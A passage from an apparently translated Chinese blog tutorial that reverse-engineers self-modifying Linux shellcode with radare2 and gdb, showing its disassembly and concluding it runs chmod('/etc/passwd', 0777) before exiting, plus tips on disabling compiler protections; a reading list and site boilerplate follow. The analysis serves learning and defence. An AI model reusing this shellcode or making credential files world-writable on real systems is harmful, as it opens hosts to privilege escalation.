<span class="number">0x0804a05f</span>              31c9  <span class="keyword">xor</span> <span class="literal">ecx</span>, <span class="literal">ecx</span>
<span class="number">0x0804a061</span>          66b9ff01  <span class="keyword">mov</span> <span class="literal">cx</span>, <span class="number">0x1ff</span>
<span class="number">0x0804a065</span>              cd80  <span class="keyword">int</span> <span class="number">0x80</span>
<span class="number">0x0804a067</span>              31c0  <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
<span class="number">0x0804a069</span>              b001  <span class="keyword">mov</span> <span class="literal">al</span>, <span class="number">0x1</span>
<span class="number">0x0804a06b</span>              31<span class="pseudo">db</span>  <span class="keyword">xor</span> <span class="literal">ebx</span>, <span class="literal">ebx</span>
<span class="number">0x0804a06d</span>              cd80  <span class="keyword">int</span> <span class="number">0x80</span>
<span class="number">0x0804a06f</span>        e8e6ffffff  <span class="keyword">call</span> <span class="number">0x804a05a</span>
<span class="number">0x0804a074</span>                2f  <span class="keyword">das</span>
<span class="number">0x0804a075</span>            <span class="number">657463</span>  <span class="keyword">je</span> <span class="number">0x804a0db</span>
<span class="number">0x0804a078</span>                2f  <span class="keyword">das</span>
<span class="number">0x0804a079</span>              <span class="number">7061</span>  <span class="keyword">jo</span> <span class="number">0x804a0dc</span>
<span class="number">0x0804a07b</span>              <span class="number">7373</span>  <span class="keyword">jae</span> <span class="number">0x804a0f0</span>
<span class="number">0x0804a07d</span>              <span class="number">7764</span>  <span class="keyword">ja</span> <span class="number">0x804a0e3</span>
<span class="number">0x0804a07f</span>                cb  <span class="keyword">retf</span>
<span class="number">0x0804a080</span>              120e  <span class="keyword">adc</span> <span class="literal">cl</span>, [<span class="literal">esi</span>]
<span class="number">0x0804a082</span>                0e  <span class="keyword">push</span> <span class="literal">cs</span>
</code></pre><p>看到<code>0x0804a058</code>之后的指令开始有效。我先看到个<code>int 0x80</code>指令。在UNIX类系统中，<code>0x80</code>终端有特殊含义：要求内核执行系统调用，系统调用号储存在<code>eax</code>中。</p>
<p>通过人工执行(通过跳转和调用)，可得<code>eax</code>在<code>0x0804a065</code>是<code>0xf</code>，在<code>0x0804a06d</code>是<code>0x1</code>。然后google下或者随便参考下x86内核头文件就知道是哪些系统调用了。</p>
<p>可查得在<code>0x0804a065</code>调用<code>chmod</code>，接着在<code>0x0804a06d</code>调用<code>exit</code>。接着检查调用参数弄清这些调用做了什么。在linux系统中，调用参数在寄存器中(<code>ebx</code>,<code>ecx</code>,<code>edx</code>, <code>esi</code>, <code>edi</code>, <code>ebp</code>)。</p>
<p><code>chmod</code>有两个参数：分别在<code>ebx</code>和<code>ecx</code>中有指向文件路径的字符指针和模式(<code>mode_t</code>，只是一个指定想要更改成的模式或者权限的整数)。<code>ebx</code>在<code>0x0804a05e</code>从栈顶弹出，向回溯源看到栈上最顶的东西是<code>0x0804a06f</code>调用的返回地址(<code>0x0804a074</code>)。当然，这根本不是返回地址，就是一种巧妙的将字符串打包到有效载荷中的方式(shellcode动态寻址)。使用<code>ps</code>命令看看它是啥：</p>
<pre><code><span class="special">[</span>0x080483a0<span class="special">]</span>&gt; ps@0x0804a074
/etc/passwd<span class="command">\xcb</span><span class="command">\x</span>12<span class="command">\x</span>0e<span class="command">\x</span>0e<span class="command">\x</span>05<span class="command">\xeb</span><span class="command">\xf</span>3<span class="command">\x</span>1209?::<span class="command">\xeb</span><span class="command">\xff</span><span class="command">\xf</span>9<span class="command">\x</span>02<span class="command">\xf</span>9<span class="command">\xfe</span><span class="command">\xf</span>8=<span class="command">\xfc</span><span class="command">\xeb</span>;<span class="command">\xfc</span><span class="command">\xf</span>9<span class="command">\xfe</span><span class="command">\xf</span>7<span class="command">\xeb</span>;40<span class="command">\xf</span>8<span class="command">\xfb</span><span class="command">\xf</span>9
</code></pre><p><code>chmod</code>的第二个参数在<code>ecx</code>中。值是<code>0x1ff</code>，换算成八进制就是<code>0777</code></p>
<pre><code>(gdb) p/o <span class="number">0x1ff</span>
<span class="variable">$2</span> = <span class="number">0777</span>
</code></pre><p>所以调用就是<code>chmod(&#39;/etc/passwd&#39;, 0777)</code></p>
<p>之后仅仅是调用<code>exit</code>退出程序。</p>
<h2 id="总结评论">总结评论</h2><p>这里是一个在运行时动态改变自身来对抗静态分析的shellcode。该技术并不新奇，确是逃避硬编码检测的简单方法。</p>
<p>现代操作系统中这个shellcode不起作用，因为有效载荷在二进制文件的<code>.data</code>区，不可写也不可执行…………译者表示这扯远了不管它，通过使用gcc的参数<code>-fno-stack-protector execstack</code>等应该可以把这些保护关上，大概吧，记不清楚了。</p>
<p>如果想有点挑战性，试试精简过的(stripped)的二进制文件！</p>
<p>有评论告诉我。</p>
<hr>
<p>以下是译者的题外话：</p>
<p>Recent：</p>
<ul>
<li>coursera crypto-11</li>
<li>statistics for engineers and the sciences</li>
<li>coursera pred-003, I give up follow this course</li>
<li>Xie Yihui，现代统计图形</li>
<li>python for data analysis</li>
</ul>
<p>Next?: append</p>
<ul>
<li>Wikibooks:x86 assembly, <a href="http://en.wikibooks.org/wiki/X86_Disassembly" target="_blank" rel="external">http://en.wikibooks.org/wiki/X86_Disassembly</a></li>
<li>phrack radare: <a href="http://phrack.org/issues/66/14.html" target="_blank" rel="external">http://phrack.org/issues/66/14.html</a></li>
<li>crackme: <a href="http://dustri.org/b/defeating-ioli-with-radare2.html" target="_blank" rel="external">http://dustri.org/b/defeating-ioli-with-radare2.html</a></li>
</ul>
<p>Future:</p>
<p>The elements of statistical learning?</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    

  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right"></i></a>
  </nav>



        </div>

        


        

      </div>

      
        
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel  sidebar-panel-active ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Liu Yuyang" itemprop="image"/>
          <p class="site-author-name" itemprop="name">Liu Yuyang</p>
        </div>
        <p class="site-description motion-element" itemprop="description">我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。</p>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">172</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          <div class="site-state-item site-state-categories">
            <a href="/categories">
              <span class="site-state-item-count">23</span>
              <span class="site-state-item-name">分类</span>
              </a>
          </div>

          <div class="site-state-item site-state-tags">
            <a href="/tags">
              <span class="site-state-item-count">60</span>
              <span class="site-state-item-name">标签</span>
              </a>
          </div>

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/reverland" target="_blank">
                  
                    <i class="fa fa-github"></i> GitHub
                  
                </a>
              </span>
            
          
        </div>

        
        

        <div class="links-of-author motion-element">
          
            <p class="site-author-name">Links</p>
            
              <span class="links-of-author-item">
                <a href="http://reverland.bitbucket.org/" target="_blank">曾经的的vimwiki</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://liutos.github.com/" target="_blank">Liutos</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.phoenixlzx.com/" target="_blank">凤凰君</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://gndrive.org/" target="_blank">高达数字实验室</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.cherrot.com/" target="_blank">Cherrot</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://xwyam.github.com/" target="_blank">xw_y_am</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://ishell.me" target="_blank">小东</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.kochiya.me/" target="_blank">AS酱</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://blog.skydark.info/" target="_blank">skydark</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://thorb.cn/" target="_blank">thorb</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.suzibin.cn/" target="_blank">doug</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://armsword.com/" target="_blank">armsword</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://zhangwenli.com/blog" target="_blank">Ovilia</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://lilydjwg.is-programmer.com/" target="_blank">仙子</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://gaohaoyang.github.io" target="_blank">HYG</a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://simmer-jun.github.io" target="_blank">Simmer</a>
              </span>
            
          
        </div>

      </section>

      

    </div>
  </aside>


      
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2011 - 
  <span itemprop="copyrightYear">2015</span>
  <span class="with-love">
    <i class="icon-next-heart fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Liu Yuyang</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT
  </a>
</div>



      </div>
    </footer>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  

  
    
    

  

    <script type="text/javascript">
      var disqus_shortname = 'reverlandblog';
      var disqus_identifier = 'page/5/index.html';
      var disqus_title = '';
      var disqus_url = '';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      run_disqus_script('count.js');
      
    </script>
  


  

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.2"></script>


  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.2"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
<script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

<script type="text/javascript" src="/js/motion.js?v=0.4.5.2" id="motion.global"></script>


  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  

  <script type="text/javascript" src="/js/bootstrap.js"></script>

  
  
  <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
  </script>

  <script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for (i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  </script>

  
    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/MathJax.js"></script>
    <script type="text/javascript" src="http://cdn.staticfile.org/mathjax/2.4.0/config/TeX-AMS-MML_HTMLorMML.js"></script>
  


  
  

</body>
</html>
